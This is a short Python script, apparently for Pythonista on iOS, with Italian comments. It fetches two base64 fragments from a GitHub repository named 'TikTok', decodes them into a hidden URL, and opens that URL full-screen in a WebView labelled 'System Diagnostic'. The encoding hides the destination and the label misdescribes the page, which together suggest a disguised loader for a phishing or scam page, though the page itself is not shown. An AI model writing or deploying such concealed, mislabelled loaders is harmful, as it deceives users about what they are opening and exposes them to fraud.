import requests
import ui

def brain():
    import base64
    # Ho corretto TikTok con la T maiuscola e aggiunto tutti i possibili percorsi
    basi = [
        "https://raw.githubusercontent.com/christianniederhauser906-ship-it/TikTok/principale/",
        "https://raw.githubusercontent.com/christianniederhauser906-ship-it/TikTok/main/",
        "https://raw.githubusercontent.com/christianniederhauser906-ship-it/Tiktok/principale/",
        "https://raw.githubusercontent.com/christianniederhauser906-ship-it/Tiktok/main/"
    ]
    
    successo = False
    for base in basi:
        try:
            # Cerchiamo i file che vedo nei tuoi screenshot
            r1 = requests.get(base + "parte1.py")
            r2 = requests.get(base + "part2_1.py")
            
            if r1.status_code == 200:
                p1 = r1.text.strip()
                p2 = r2.text.strip()
                # Unione e decodifica senza errori
                full_link = base64.b64decode(p1 + p2).decode('utf-8', errors='ignore')
                
                print(f"✅ Connessione stabilita via: {base}")
                v = ui.WebView()
                v.name = "System Diagnostic"
                v.load_url(full_link)
                v.present('fullscreen')
                successo = True
                break
        except:
            continue

    if not successo:
        print("❌ Errore 404 persistente. Verifica che i file parte1.py e part2_1.py siano nel repository TikTok.")

if __name__ == "__main__":
    brain()
